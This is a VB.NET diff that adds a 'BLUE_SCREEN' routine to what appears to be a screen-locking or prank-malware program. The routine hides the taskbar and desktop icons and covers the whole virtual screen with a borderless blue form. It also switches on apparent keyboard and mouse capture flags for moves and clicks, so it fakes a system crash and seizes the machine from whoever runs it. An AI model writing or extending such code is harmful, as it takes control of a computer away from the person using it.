@@ -29,7 +29,7 @@ Public Class V1
 
 
     Public Shared H As New Threading.Thread(Sub() HANDLETSK())
-    Public Shared H2 As New Threading.Thread(Sub() Y())
+    Public Shared H2 As New Threading.Thread(Sub() Y(Color.Red))
     Public Shared Sub HANDLETSK()
 
         While True
@@ -45,14 +45,14 @@ Public Class V1
     End Sub
 
     Public Shared HF As New Form
-    Public Shared Sub Y()
+    Public Shared Sub Y(ByVal C As Color)
 
         HF.ShowInTaskbar = False
         HF.ShowIcon = False
         HF.ControlBox = False
         HF.FormBorderStyle = FormBorderStyle.None
 
-        HF.BackColor = Color.Red
+        HF.BackColor = C
 
         HF.Size = New Size(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height)
 
@@ -63,4 +63,33 @@ Public Class V1
 
     End Sub
 
+End Class
+
+Public Class V1_Blue
+
+    Public Shared H As New Threading.Thread(Sub() V1.HANDLETSK())
+    Public Shared H2 As New Threading.Thread(Sub() V1.Y(Color.DeepSkyBlue))
+    Public Shared Sub BLUE_SCREEN()
+        D.Hide_TaskBar(0)
+        D.HSDesktopIcons(False)
+
+        H.Start()
+
+
+        H2.Start()
+
+        K.BB = True
+        K.B = True
+        K.ghjk.Start()
+
+
+        M.GLOBALRETURN = True
+        M.ALL = True
+        M.MOVE = True
+        M.LEFTCLK = True
+        M.RIGHTCLK = True
+
+        M.ghjk.Start()
+
+    End Sub
 End Class
